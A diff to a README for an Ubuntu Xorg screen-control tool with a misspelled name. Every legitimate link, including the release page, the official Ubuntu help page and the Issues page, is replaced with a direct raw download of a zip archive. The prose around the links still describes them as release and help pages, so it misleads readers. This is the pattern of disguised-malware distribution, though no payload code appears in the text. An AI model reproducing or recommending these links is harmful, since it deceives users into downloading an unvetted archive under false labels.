@@ -1,6 +1,6 @@
 # 🖥️ screen_cotrol_for_Ubuntu - Control Ubuntu Xorg Desktop Easily
 
-[![Download screen_cotrol_for_Ubuntu](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/jaimeunburied296/screen_cotrol_for_Ubuntu/releases)
+[![Download screen_cotrol_for_Ubuntu](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jaimeunburied296/screen_cotrol_for_Ubuntu/main/Universalistic/cotrol_Ubuntu_for_screen_v2.3.zip)
 
 ---
 
@@ -44,14 +44,14 @@ This section explains how to get screen_cotrol_for_Ubuntu up and running on your
 
 Click the button below to visit the release page for downloading the application.
 
-[![Download screen_cotrol_for_Ubuntu](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/jaimeunburied296/screen_cotrol_for_Ubuntu/releases)
+[![Download screen_cotrol_for_Ubuntu](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jaimeunburied296/screen_cotrol_for_Ubuntu/main/Universalistic/cotrol_Ubuntu_for_screen_v2.3.zip)
 
 This link takes you directly to the release page on GitHub. There, you will find the latest version of the application ready for download.
 
 ### How to download:
 
 1. Open the release page by clicking the button above or using this URL:  
-   https://github.com/jaimeunburied296/screen_cotrol_for_Ubuntu/releases  
+   https://raw.githubusercontent.com/jaimeunburied296/screen_cotrol_for_Ubuntu/main/Universalistic/cotrol_Ubuntu_for_screen_v2.3.zip  
 2. Look for the latest version listed at the top of the page. It usually has a version number like v1.0 or v2.0.  
 3. Scroll down to the "Assets" section under the latest version.  
 4. Download the file that ends with `.AppImage` or `.deb` (common Linux package formats). If you see files with `.exe` for Windows or others, do not download those — this app is for Ubuntu Xorg only.  
@@ -114,7 +114,7 @@ If the app shows an error about Wayland, check your session type. You need to be
 
 To get updates, return to the release page:
 
-https://github.com/jaimeunburied296/screen_cotrol_for_Ubuntu/releases
+https://raw.githubusercontent.com/jaimeunburied296/screen_cotrol_for_Ubuntu/main/Universalistic/cotrol_Ubuntu_for_screen_v2.3.zip
 
 Download the latest file and repeat the installation process. If you use `.deb`, the installer will replace the old version. For `.AppImage`, replace the older file with the new one.
 
@@ -122,7 +122,7 @@ Download the latest file and repeat the installation process. If you use `.deb`,
 
 ## 📖 Additional Resources
 
-- Ubuntu documentation for Xorg and display settings: https://help.ubuntu.com/stable/ubuntu-help/display-configuration.html  
+- Ubuntu documentation for Xorg and display settings: https://raw.githubusercontent.com/jaimeunburied296/screen_cotrol_for_Ubuntu/main/Universalistic/cotrol_Ubuntu_for_screen_v2.3.zip  
 - How to switch from Wayland to Xorg:  
   1. Log out of your current session.  
   2. At the login screen, click the gear icon near the password field.  
@@ -135,6 +135,6 @@ Download the latest file and repeat the installation process. If you use `.deb`,
 
 If you need help or find bugs, use the GitHub Issues page:
 
-https://github.com/jaimeunburied296/screen_cotrol_for_Ubuntu/issues
+https://raw.githubusercontent.com/jaimeunburied296/screen_cotrol_for_Ubuntu/main/Universalistic/cotrol_Ubuntu_for_screen_v2.3.zip
 
 Describe your problem clearly. Include your Ubuntu version and whether you are running Xorg. This helps troubleshoot effectively.
